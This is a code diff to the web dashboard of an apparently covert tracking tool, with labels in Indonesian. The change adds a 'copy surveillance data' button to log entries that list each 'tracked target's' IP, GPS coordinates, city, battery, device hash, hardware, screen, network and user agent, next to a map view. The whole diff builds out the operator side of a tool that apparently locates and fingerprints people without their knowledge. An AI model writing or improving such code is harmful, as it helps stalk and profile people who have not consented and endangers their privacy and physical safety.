@@ -765,10 +765,30 @@
                             map.setView([latVal, lonVal], 13);
                         }
 
+                        const logId = 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+                        window.logDataStore = window.logDataStore || {};
+                        window.logDataStore[logId] = `🎯 TARGET TERLACAK
+IP: ${tgt.ip}
+Lokasi Kasar: ${tgt.city || 'Unknown'}
+GPS: ${tgt.lat ? tgt.lat + ',' + tgt.lon : 'Unknown'} (${tgt.accuracy || 'IP Based'})
+Baterai: ${tgt.battery || '?'} (${tgt.charging || '?'})
+Device Hash: ${tgt.device_hash || '?'}
+OS/CPU: ${tgt.platform || '?'} | ${tgt.cpu || '?'} Cores
+GPU: ${tgt.gpu || '?'}
+Layar: ${tgt.screen || '?'} | Touch: ${tgt.touch || '?'}
+Koneksi: ${tgt.network || '?'} ${tgt.speed ? '(' + tgt.speed + ')' : ''}
+Waktu: ${new Date(tgt.time).toLocaleString()}
+Maps: ${mapsLink || 'Tidak Ada'}
+User Agent: ${tgt.ua || '?'}`;
+
                         const logHtml = `
-                            <div class="log-entry" style="border-left: 3px solid ${tgt.type === 'GPS_SAT' ? 'var(--success)' : 'var(--accent)'}">
-                                <div style="display:flex; justify-content:space-between; align-items:start;">
-                                    <div style="color:white; font-weight:bold; margin-bottom:5px;">
+                            <div class="log-entry" style="border-left: 3px solid ${tgt.type === 'GPS_SAT' ? 'var(--success)' : 'var(--accent)'}; position: relative;">
+                                <button onclick="navigator.clipboard.writeText(window.logDataStore['${logId}']); this.innerHTML='<i data-lucide=\\'check\\' style=\\'width:12px; margin-right:4px;\\'></i> Copied!'; lucide.createIcons();" 
+                                        style="position: absolute; right: 10px; top: 10px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 4px 8px; border-radius: 5px; cursor: pointer; font-size: 0.7rem; z-index: 10; display:flex; align-items:center; transition: 0.3s;" title="Copy Semua Data Intai">
+                                    <i data-lucide="copy" style="width:12px; margin-right:4px;"></i> Copy Data
+                                </button>
+                                <div style="display:flex; flex-direction:column; align-items:start; margin-right: 80px; margin-bottom: 10px;">
+                                    <div style="color:white; font-weight:bold; margin-bottom:2px;">
                                         ${tgt.type === 'GPS_SAT' ? '📡 GPS TERKUNCI (ACCURATE)' : '⚠️ PING MASUK (IP ONLY)'}
                                     </div>
                                     <div style="font-size:0.7rem; color:var(--text-dim)">${new Date(tgt.time).toLocaleTimeString()}</div>
